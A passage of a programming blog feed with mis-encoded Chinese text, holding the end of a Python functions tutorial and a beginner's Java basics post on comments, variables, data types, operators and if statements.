morning!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•åœ¨pythonä¸­è°ƒç”¨å‡½æ•°ï¼Ÿ"><a href="#å¦‚ä½•åœ¨pythonä¸­è°ƒç”¨å‡½æ•°ï¼Ÿ" class="headerlink" title="å¦‚ä½•åœ¨pythonä¸­è°ƒç”¨å‡½æ•°ï¼Ÿ"></a>å¦‚ä½•åœ¨pythonä¸­è°ƒç”¨å‡½æ•°ï¼Ÿ</h3><p>å®šä¹‰å‡½æ•°åï¼Œæˆ‘ä»¬å¯ä»¥ä»å¦ä¸€ä¸ªå‡½æ•°ï¼Œç¨‹åºç”šè‡³Pythonæç¤ºç¬¦ä¸­è°ƒç”¨å®ƒã€‚è¦è°ƒç”¨å‡½æ•°ï¼Œæˆ‘ä»¬åªéœ€é”®å…¥å¸¦æœ‰é€‚å½“å‚æ•°çš„å‡½æ•°åç§°å³å¯ã€‚</p><h2 id="return-è¯­å¥"><a href="#return-è¯­å¥" class="headerlink" title="return è¯­å¥"></a>return è¯­å¥</h2><p>returnè¯­å¥ç”¨äºé€€å‡ºå‡½æ•°å¹¶è¿”å›åˆ°è°ƒç”¨å‡½æ•°çš„ä½ç½®ã€‚</p><h3 id="å›è¯­æ³•"><a href="#å›è¯­æ³•" class="headerlink" title="å›è¯­æ³•"></a>å›è¯­æ³•</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [expression_list]</span><br></pre></td></tr></table></figure><p>è¯¥è¯­å¥å¯ä»¥åŒ…å«ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼å°†è¢«æ±‚å€¼å¹¶è¿”å›å€¼ã€‚å¦‚æœè¯¥è¯­å¥ä¸­æ²¡æœ‰è¡¨è¾¾å¼ï¼Œæˆ–è€…returnè¯­å¥æœ¬èº«ä¸å­˜åœ¨äºå‡½æ•°ä¸­ï¼Œåˆ™è¯¥å‡½æ•°å°†è¿”å›Noneå¯¹è±¡ã€‚</p><p><strong>ä¾‹å¦‚ï¼š</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(greet(<span class="string">&quot;May&quot;</span>))</span><br><span class="line">Hello, May. Good morning!</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><p>Noneæ˜¯è¿”å›å€¼ï¼Œå› ä¸ºgreet()å‡½æ•°ç›´æ¥æ‰“å°åç§°ï¼Œå¹¶ä¸”æ²¡æœ‰ä½¿ç”¨returnè¯­å¥ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">absolute_value</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¿™ä¸ªå‡½æ•°è¿”å›è¾“å…¥æ•°å­—çš„ç»å¯¹å€¼&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(absolute_value(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(absolute_value(-<span class="number">4</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="Functionå¦‚ä½•åœ¨Pythonä¸­å·¥ä½œï¼Ÿ"><a href="#Functionå¦‚ä½•åœ¨Pythonä¸­å·¥ä½œï¼Ÿ" class="headerlink" title="Functionå¦‚ä½•åœ¨Pythonä¸­å·¥ä½œï¼Ÿ"></a>Functionå¦‚ä½•åœ¨Pythonä¸­å·¥ä½œï¼Ÿ</h2><p><img src="https://www.cainiaoplus.com/run/images/python-how-function-works_1.jpg" alt="å‡½æ•°å¦‚ä½•åœ¨Pythonä¸­å·¥ä½œï¼Ÿ"></p><h2 id="å˜é‡çš„ä½œç”¨åŸŸå’Œç”Ÿå‘½å‘¨æœŸ"><a href="#å˜é‡çš„ä½œç”¨åŸŸå’Œç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="å˜é‡çš„ä½œç”¨åŸŸå’Œç”Ÿå‘½å‘¨æœŸ"></a>å˜é‡çš„ä½œç”¨åŸŸå’Œç”Ÿå‘½å‘¨æœŸ</h2><p>å˜é‡çš„ä½œç”¨åŸŸæ˜¯ç¨‹åºä¸­å¯ä»¥è¯†åˆ«è¯¥å˜é‡çš„éƒ¨åˆ†ã€‚ä»å‡½æ•°å¤–éƒ¨çœ‹ä¸åˆ°åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„å‚æ•°å’Œå˜é‡ã€‚å› æ­¤ï¼Œå®ƒä»¬å…·æœ‰æœ¬åœ°ä½œç”¨åŸŸã€‚</p><p>å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯å˜é‡åœ¨å†…å­˜ä¸­é€€å‡ºçš„æ—¶é—´ã€‚å‡½æ•°å†…éƒ¨å˜é‡çš„ç”Ÿå‘½å‘¨æœŸä¸å‡½æ•°æ‰§è¡Œçš„æ—¶é—´ä¸€æ ·é•¿ã€‚</p><p>ä¸€æ—¦æˆ‘ä»¬ä»å‡½æ•°è¿”å›ï¼Œå®ƒä»¬å°±ä¼šè¢«é”€æ¯ã€‚å› æ­¤ï¼Œå‡½æ•°æ— æ³•è®°ä½å…¶å…ˆå‰è°ƒç”¨ä¸­çš„å˜é‡å€¼ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œç”¨äºè¯´æ˜å‡½æ•°å†…éƒ¨å˜é‡çš„ç”Ÿå‘½å‘¨æœŸã€‚</p><p>ç¤ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def my_func():</span><br><span class="line">x = 10</span><br><span class="line">print(&quot;å‡½æ•°å†…éƒ¨å€¼:&quot;,x)</span><br><span class="line"></span><br><span class="line">x = 20</span><br><span class="line">my_func()</span><br><span class="line">print(&quot;å‡½æ•°å¤–éƒ¨å€¼:&quot;,x)</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡½æ•°å†…éƒ¨å€¼: 10</span><br><span class="line">å‡½æ•°å¤–éƒ¨å€¼: 20</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°xçš„åˆå§‹å€¼ä¸º20ã€‚å³ä½¿å‡½æ•°my_func()å°†xçš„å€¼æ›´æ”¹ä¸º10ï¼Œå®ƒä¹Ÿä¸ä¼šå½±å“å‡½æ•°å¤–éƒ¨çš„å€¼ã€‚</p><p>è¿™æ˜¯å› ä¸ºå‡½æ•°å†…éƒ¨çš„å˜é‡xä¸å‡½æ•°å¤–éƒ¨çš„xå˜é‡ä¸åŒã€‚å°½ç®¡å®ƒä»¬å…·æœ‰ç›¸åŒçš„åç§°ï¼Œ<strong>ä½†æ˜¯å®ƒä»¬æ˜¯ä¸¤ä¸ªå…·æœ‰ä¸åŒä½œç”¨åŸŸçš„ä¸åŒå˜é‡</strong>ã€‚</p><p>å¦ä¸€æ–¹é¢ï¼Œä»å¤–éƒ¨å¯ä»¥çœ‹åˆ°å‡½æ•°å¤–éƒ¨çš„å˜é‡ã€‚å®ƒä»¬å…·æœ‰å…¨å±€ä½œç”¨åŸŸï¼Œä¹Ÿå°±æ˜¯å‡½æ•°å†…å¤–éƒ¨éƒ½å¯ä»¥ä½¿ç”¨è¯¥å…¨å±€å˜é‡ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä»å‡½æ•°å†…éƒ¨è¯»å–è¿™äº›å€¼ï¼Œä½†ä¸èƒ½æ›´æ”¹ï¼ˆå†™å…¥ï¼‰å®ƒä»¬ã€‚å¦‚æœè¦åœ¨å‡½æ•°å¤–éƒ¨ä¿®æ”¹å˜é‡çš„å€¼ï¼Œå¿…é¡»ä½¿ç”¨å…³é”®å­—globalï¼Œå°†å®ƒä»¬å£°æ˜ä¸ºå…¨å±€å˜é‡ã€‚</p><h2 id="å‡½æ•°ç±»å‹"><a href="#å‡½æ•°ç±»å‹" class="headerlink" title="å‡½æ•°ç±»å‹"></a>å‡½æ•°ç±»å‹</h2><p>åŸºæœ¬ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å°†å‡½æ•°åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ç±»å‹ï¼š</p><ol><li><a href="https://www.cainiaoplus.com/python/python-methods-built-in.html">å†…ç½®å‡½æ•°-Pythonå†…ç½®çš„å‡½æ•°</a>ã€‚</li><li><a href="https://www.cainiaoplus.com/python/python-user-defined-function.html">ç”¨æˆ·å®šä¹‰çš„å‡½æ•°</a> -ç”¨æˆ·è‡ªå·±<a href="https://www.cainiaoplus.com/python/python-user-defined-function.html">å®šä¹‰çš„å‡½æ•°</a>ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåŸºç¡€</title>
      <link href="/2024/09/10/java%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/09/10/java%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>1.å®‰è£…jdkå’ŒIDEA</p><p>2.åˆ›å»ºè‡ªå·±çš„ç¬¬ä¸€ä¸ªé¡¹ç›®</p><p>3.ç¼–å†™è‡ªå·±çš„ç¬¬ä¸€æ®µä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello.world&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hello.world</span></span><br></pre></td></tr></table></figure><p>æ³¨é‡Š</p><p>å•è¡Œæ³¨é‡Š &#x2F; &#x2F;</p><p>å¤šè¡Œæ³¨é‡Š&#x2F;**&#x2F;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n;</span><br><span class="line"><span class="comment">//è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€æ®µä»£ç </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="comment">//mainæ–¹æ³•æ˜¯ç¨‹åºçš„å…¥å£</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//åœ¨æ§åˆ¶å°ä¸Šè¿›è¡Œæ‰“å°</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">å¤šè¡Œæ³¨é‡Š</span></span><br><span class="line"><span class="comment">éšä¾¿æ‰“ä¸€äº›ä¸œè¥¿</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¸¸ç”¨å¿«æ·é”®ï¼š</span><br><span class="line">mainæ–¹æ³•å¿«æ·é”®ï¼špsvm+å›è½¦</span><br><span class="line">æ§åˆ¶å°åŸæ ·è¾“å‡ºï¼šsout+å›è½¦</span><br><span class="line">åˆ é™¤ä¸€è¡Œï¼šctrl+y</span><br><span class="line">å¤åˆ¶â€”è¡Œï¼šctrl+d</span><br></pre></td></tr></table></figure><h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><p>å˜é‡çš„å«ä¹‰</p><p>å˜é‡æœ¬è´¨ä¸Šå°±æ˜¯ä»£è¡¨ä¸€ä¸ªâ€å¯æ“ä½œçš„å­˜å‚¨ç©ºé—´â€ï¼Œç©ºé—´ä½ç½®æ˜¯ç¡®å®š<br>çš„ï¼Œä½†æ˜¯é‡Œé¢æ”¾ç½®ä»€ä¹ˆå€¼ä¸ç¡®å®šã€‚æˆ‘ä»¬å¯é€šè¿‡å˜é‡åæ¥è®¿é—®â€œå¯¹åº”<br>çš„å­˜å‚¨ç©ºé—´â€ï¼Œä»è€Œæ“çºµè¿™ä¸ªâ€œå­˜å‚¨ç©ºé—´â€å­˜å‚¨çš„å€¼ã€‚Javaæ˜¯ä¸€ç§<br>å¼ºç±»å‹è¯­è¨€ï¼Œæ¯ä¸ªå˜é‡éƒ½å¿…é¡»å£°æ˜å…¶æ•°æ®ç±»å‹ã€‚å˜é‡çš„æ•°æ®ç±»å‹å†³<br>å®šäº†å˜é‡å æ®å­˜å‚¨ç©ºé—´çš„å¤§å°ã€‚</p><p>å˜é‡çš„å­¦ä¹ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ­¥éª¤1ï¼šå˜é‡çš„å£°æ˜</span><br><span class="line">type varName [=value][,varName[=value]...];</span><br><span class="line">æ³¨æ„ï¼šå˜é‡ä¸å¯ä»¥é‡å¤å®šä¹‰</span><br><span class="line">æ­¥éª¤2ï¼šå˜é‡çš„èµ‹å€¼</span><br><span class="line">æ³¨æ„ï¼šå˜é‡çš„å£°æ˜å’Œèµ‹å€¼å¯ä»¥åœ¨åŒä¸€è¡Œè¡¨ç¤º</span><br><span class="line">æ­¥éª¤3ï¼šå˜é‡çš„ä½¿ç”¨</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTvar</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.å˜é‡çš„å£°æ˜ï¼ˆå®šä¹‰ï¼‰</span></span><br><span class="line">        <span class="comment">//å®šä¹‰ä¸€ä¸ªåå­—çš„å˜é‡</span></span><br><span class="line">        String name;<span class="comment">//å®šä¹‰ä¸€ä¸ªå˜é‡ä¸ºnameï¼Œç±»å‹ä¸ºstring</span></span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šå˜é‡ä¸å¯é‡å¤å®šä¹‰</span></span><br><span class="line">        <span class="type">int</span> a,b;<span class="comment">//åŒæ—¶å¯ä»¥å®šä¹‰å¤šä¸ªå˜é‡</span></span><br><span class="line">        name=<span class="string">&quot;Gu0f3n&quot;</span>;<span class="comment">//ç­‰å·èµ‹å€¼</span></span><br><span class="line">        <span class="comment">//2.å˜é‡çš„èµ‹å€¼</span></span><br><span class="line">        <span class="type">int</span> age;</span><br><span class="line">        age=<span class="number">18</span>;<span class="comment">//ç­‰å·èµ‹å€¼</span></span><br><span class="line">        age=<span class="number">32</span>;</span><br><span class="line">        age=<span class="number">40</span>+<span class="number">18</span>;</span><br><span class="line">        <span class="comment">//å˜é‡çš„å®šä¹‰å’Œå¤åˆ¶å¯ä»¥å†™åœ¨åŒä¸€è¡Œ</span></span><br><span class="line">        <span class="type">int</span> age1=<span class="number">19</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> e,f =<span class="number">30</span>;<span class="comment">//eæ²¡æœ‰èµ‹å€¼ï¼Œfèµ‹å€¼30</span></span><br><span class="line">        <span class="comment">//å˜é‡çš„ä½¿ç”¨</span></span><br><span class="line">        System.out.println(age);<span class="comment">//ä½¿ç”¨å˜é‡çš„æ—¶å€™é€šè¿‡åå­—è®¿é—®åˆ°ç©ºé—´ä¸­å…·ä½“çš„å€¼</span></span><br><span class="line">        <span class="type">int</span> g=<span class="number">20</span>;</span><br><span class="line">        System.out.println(age+g);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æ§åˆ¶å°çš„æ‰“å°ç»“æœ</span></span><br><span class="line"><span class="comment">58</span></span><br><span class="line"><span class="comment">78</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p>æ•°æ®ç±»å‹çš„åˆ†ç±»</p><p>Javaæ˜¯ä¸€ç§å¼ºç±»å‹è¯­è¨€ï¼Œæ¯ä¸ªå˜é‡éƒ½å¿…é¡»å£°æ˜å…¶æ•°æ®ç±»å‹<br>Javaçš„æ•°æ®ç±»å‹å¯åˆ†ä¸ºä¸¤å¤§ç±»ï¼šåŸºæœ¬æ•°æ®ç±»å‹ï¼ˆprimitivedata<br>typeï¼‰å’Œå¼“lç”¨æ•°æ®ç±»å‹ï¼ˆreference data typeï¼‰</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_19.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTtype</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//åŸºæœ¬æ•°æ®ç±»å‹</span></span><br><span class="line">        <span class="comment">//1.æ•´æ•°ç±»å‹</span></span><br><span class="line">        <span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span><span class="number">10</span>;<span class="comment">//è¡¨è¿°èŒƒå›´-128~127</span></span><br><span class="line">        <span class="type">short</span> <span class="variable">b</span> <span class="operator">=</span><span class="number">22000</span>;<span class="comment">//è¡¨è¿°èŒƒå›´ï¼šæ­£è´Ÿä¸‰ä¸‡</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span><span class="number">30123131</span>;<span class="comment">//æ­£è´Ÿ21äº¿</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">d</span> <span class="operator">=</span><span class="number">401215151513131513L</span>;<span class="comment">//è¡¨è¿°èŒƒå›´ å¾ˆå¤§ å¦‚æœè¡¨ç¤ºçš„æ•°çš„èŒƒå›´è¶…è¿‡intlç±»å‹èŒƒå›´å°±éœ€è¦åŠ L</span></span><br><span class="line">        <span class="comment">//2.æµ®ç‚¹ç±»å‹</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">e</span> <span class="operator">=</span><span class="number">3.14f</span>;<span class="comment">//å¦‚æœfloatè¡¨ç¤ºä¸€ä¸ªå°æ•°ï¼Œåé¢å¿…é¡»åŠ ä¸Šf</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">f</span> <span class="operator">=</span><span class="number">4.56789</span>;</span><br><span class="line">        <span class="comment">//3.å­—ç¬¦ç±»å‹</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">g</span> <span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;<span class="comment">//å•å¼•å·å¼•èµ·æ¥çš„å•ä¸ªå­—ç¬¦</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Gu0f3n&quot;</span>);<span class="comment">//åç»­çš„å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="comment">//4.å¸ƒå°”ç±»å‹</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span><span class="literal">true</span>;<span class="comment">//true and false</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_27.png" alt="img"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTope</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.ç®—æ•°è¿ç®—ç¬¦</span></span><br><span class="line">        <span class="comment">//åŠ å· 1.è¡¨ç¤ºæ­£æ•°2.ç›¸åŠ  3.å­—ç¬¦ä¸²æ‹¼æ¥</span></span><br><span class="line">        System.out.println(+<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="number">5</span>+<span class="number">6</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;è¾“å‡ºä¸€ä¸ªæ•°&quot;</span>+num);</span><br><span class="line">        System.out.println(<span class="string">&quot;abc&quot;</span>+<span class="number">5</span>+<span class="number">6</span>);</span><br><span class="line">        <span class="comment">//åªè¦+å·¦å³ä¸¤ä¾§ä»»æ„ä¸€ä¾§æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆç»“æœå°±æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="comment">//++è‡ªå¢</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span><span class="number">85</span>;</span><br><span class="line">        a++;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">85</span>;</span><br><span class="line">        ++b;<span class="comment">//æ— è®º++æ”¾åœ¨å˜é‡å‰è¿˜æ˜¯åéƒ½æ˜¯+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        a=<span class="number">5</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> a++ + <span class="number">7</span>;<span class="comment">//å¦‚æœ++åœ¨å˜é‡çš„åé¢ å…ˆè¿ç®—ååŠ 1ï¼Œm=a+7 a+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(m);</span><br><span class="line">        a=<span class="number">5</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> ++a + <span class="number">7</span>;<span class="comment">//++åœ¨å˜é‡å‰ï¼Œå…ˆåŠ 1ï¼Œåœ¨è¿ç®—ï¼Œa=a+1,n=a+7</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(n);</span><br><span class="line">    &#125;<span class="comment">//ç¨‹åºå…¥å£</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">10</span></span><br><span class="line"><span class="comment">11</span></span><br><span class="line"><span class="comment">è¾“å‡ºä¸€ä¸ªæ•°10</span></span><br><span class="line"><span class="comment">abc56</span></span><br><span class="line"><span class="comment">86</span></span><br><span class="line"><span class="comment">86</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">12</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">13</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTOPe2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//èµ‹å€¼è¿ç®—ç¬¦ =</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span><span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num3</span> <span class="operator">=</span><span class="number">10</span>+<span class="number">30</span>;</span><br><span class="line">        <span class="comment">//æ±‚å’Œ</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        sum+=num1;</span><br><span class="line">        sum+=num2;<span class="comment">//sum=sum+num2;</span></span><br><span class="line">        sum+=num3;<span class="comment">//sum=sum+num3;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;å’Œï¼š&quot;</span>+sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#å’Œï¼š<span class="number">70</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTope3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//å…³ç³»è¿ç®—ç¬¦==ï¼Œæœ€ç»ˆç»“æœæ˜¯å¸ƒå°”å€¼ï¼Œä¸æ˜¯trueå°±æ˜¯false</span></span><br><span class="line">        System.out.println(<span class="number">5</span>==<span class="number">6</span>);</span><br><span class="line">        System.out.println(<span class="number">5</span>==<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//é€»è¾‘è¿ç®—ç¬¦ï¼šé€»è¾‘è¿ç®—ç¬¦å·¦å³è¿æ¥çš„æ˜¯å¸ƒå°”å€¼</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>&amp;&amp;<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//&amp;&amp;é€»è¾‘ éƒ½æ˜¯ture åˆ™ä¸ºtrue æœ‰ä¸€ä¸ªfalseéƒ½ä¸ºfalse</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>&amp;&amp;<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>&amp;&amp;<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//||é€»è¾‘ å¦‚æœéƒ½ä¸ºfalse ç»“æœéƒ½ä¸ºfalse</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>||<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>||<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">false</span>||<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>||<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æ§åˆ¶å°ç»“æœï¼š</span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½œç”¨ï¼šæµç¨‹æ§åˆ¶è¯­å¥æ˜¯ç”¨æ¥æ§åˆ¶ç¨‹åºä¸­å„è¯­å¥æ‰§è¡Œé¡ºåºçš„è¯­</span><br><span class="line">å¥ï¼Œå¯ä»¥æŠŠè¯­å¥ç»„åˆæˆèƒ½å®Œæˆä¸€å®šåŠŸèƒ½çš„å°é€»è¾‘æ¨¡å—</span><br></pre></td></tr></table></figure><p>åˆ†ç±»</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_28.png"></p><h2 id="åˆ†æ”¯ç»“æ„"><a href="#åˆ†æ”¯ç»“æ„" class="headerlink" title="åˆ†æ”¯ç»“æ„"></a>åˆ†æ”¯ç»“æ„</h2><p>ifå•åˆ†æ”¯</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_29.png" alt="img"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//éœ€æ±‚ åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦å¤§äº0</span></span><br><span class="line">        <span class="comment">//ç»™å®šä¸€ä¸ªæ•°</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">13</span>;</span><br><span class="line">        <span class="comment">//åˆ¤å®š</span></span><br><span class="line">        <span class="keyword">if</span>(num &gt;<span class="number">10</span>)&#123;<span class="comment">//if 